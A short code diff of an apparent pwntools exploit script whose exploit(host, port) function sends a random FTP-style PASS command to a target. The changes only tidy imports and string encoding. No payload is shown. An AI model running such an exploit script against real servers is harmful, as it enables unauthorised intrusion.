@@ -1,6 +1,6 @@
-import socket
-import time
 import argparse
+import time
+
 from pwn import *
 
 
@@ -45,9 +45,7 @@ def exploit(host, port):
         return
 
     s.send(
-        f"PASS {''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(6))}\r\n".encode(
-            "utf-8"
-        )
+        f"PASS {''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(6))}\r\n".encode()
     )
     time.sleep(5)
 
